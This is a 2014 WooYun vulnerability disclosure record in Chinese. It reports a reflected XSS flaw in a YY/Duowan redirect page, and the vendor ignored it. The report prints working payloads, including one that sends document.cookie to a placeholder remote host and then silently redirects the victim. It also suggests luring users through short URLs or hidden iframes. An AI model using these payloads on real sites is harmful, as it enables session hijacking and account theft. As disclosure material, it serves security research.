{"id": 56081, "wybug_id": "wooyun-2014-058992", "wybug_title": "多玩YY跳转页面XSS可获取用户cookie", "wybug_corp": "广州多玩", "wybug_author": "谢统领", "wybug_date": "2014-04-30 19:08", "wybug_open_date": "2014-05-05 19:09", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： YY论坛外部链接会自动转换成：http://redir.yy.duowan.com/redir.php?url=URL这里是通过JS进行跳转，而且没有过滤特殊标签。 详细说明：  view-source: http://redir.yy.duowan.com/redir.php?url=URL\n<script language='javascript' type='text/javascript'>location.href='warning.php?url=URL'</script>\n然后改成view-source:http://redir.yy.duowan.com/redir.php?url=URL%3C/script%3E\n<script language='javascript' type='text/javascript'>location.href='warning.php?url=URL</script>'</script>\n可见未做任何过滤，这里可以构造XSS脚本截取用户在YY.com的登录cookie。firefox因为基本没有XSS审查机制，所以直接可以在用户不知情的情况下获取到cookie。而ie和chrome过滤比较严格，目前只有在诱惑用户点击的情况下获取cookie。   漏洞证明：  1.firefox下构造URL参数：\nhttp://redir.yy.duowan.com/redir.php?url=http://www.yy.com/15487288/?%3C/script%3E%3Csvg/onload=%22javascript:var%20a=%28new%20Image%28%29%29;a.src=%27http://URL/test.php?x=%27%252BencodeURIComponent%28document.cookie%29;a.onerror=function%28%29{location.replace('http://www.yy.com/15487288/')}%22%3E\n生成代码如下：\n<script language='javascript' type='text/javascript'>location.href='warning.php?url=http://www.yy.com/15487288/?</script><svg/onload=\"javascript:var a=(new Image());a.src='http://URL/test.php?x='+encodeURIComponent(document.cookie);a.onerror=function(){location.replace('http://www.yy.com/15487288/')}\">'</script>\n用firefox访问时，会跳到http://www.yy.com/15487288/，但是cookie已经被远程截取。用户在毫不知情的情况下，以为直接进入了 http://www.yy.com/15487288/。\n\n2.chrome下构造URL参数：\nhttp://redir.yy.duowan.com/redir.php?url=%3C/script%3E<h1>点击黑框有惊喜！</h1>%3Csvg%3E%3Cuse%20height=200%20width=200%20xlink:href=%27http://redir.yy.duowan.com/redir.php?url=%3Csvg%20id%3D%22rectangle%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20%20%20%20width%3D%22100%22%20height%3D%22100%22%3E%3Ca%20xlink%3Ahref%3D%22javascript%3Aalert%28document.cookie%29%22%3E%3Crect%20class%3D%22blue%22%20x%3D%220%22%20y%3D%220%22%20width%3D%22100%22%20height%3D%22100%22%20%2F%3E%3C%2Fa%3E%3C%2Fsvg%3E%23rectangle%27/%3E%3C/svg%3E\n生成代码如下：\n<script language='javascript' type='text/javascript'>location.href='warning.php?url=</script><h1>点击黑框有惊喜！</h1><svg><use height=200 width=200 xlink:href='http://redir.yy.duowan.com/redir.php?url=<svg id=\"rectangle\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"    width=\"100\" height=\"100\"><a xlink:href=\"javascript:alert(document.cookie)\"><rect class=\"blue\" x=\"0\" y=\"0\" width=\"100\" height=\"100\" /></a></svg>#rectangle'/></svg>'</script>\n出现黑框，点击后弹出cookie，可惜不能自动跳转。。。\n\n也许有人会说，这种地址怎么会有人去打开，但如果是生成短网址呢：http://dwz.cn/hdBI4或者直接在第三方网站通过iframe页面隐藏或者伪装成其它按钮诱惑用户点击呢？3.IE下没有试，应该也可以在用户点击情况下获取cookie   修复方案：  过滤特殊字符，或者别用JS跳转。。。   版权声明：转载请注明来源 谢统领@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-05-05 19:09 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-30 20:48 |    \t\t谢统领 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 谢统领)\t\t \n  终于注册进来了，我就是想开通个帐号。。。    \n     2014-05-02 04:32 |    \t\t佩佩 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:8        | 一个热衷于网络安全的白帽子,具有很强的逻...)\t\t \n  oh,no~    \n     2014-05-06 10:08 |    \t\t伟哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:29        | 不怕流氓有文化,就怕色狼有耐心,那么一只起...)\t\t \n  @谢统领 欢迎     \n     2014-05-08 12:27 |    \t\t谢统领 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 谢统领)\t\t \n  谢谢 @伟哥 我就是练练手，果然无影响厂商忽略    \n     2014-05-08 15:12 |    \t\t伟哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:29        | 不怕流氓有文化,就怕色狼有耐心,那么一只起...)\t\t \n  @谢统领 有机会 多多交流    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}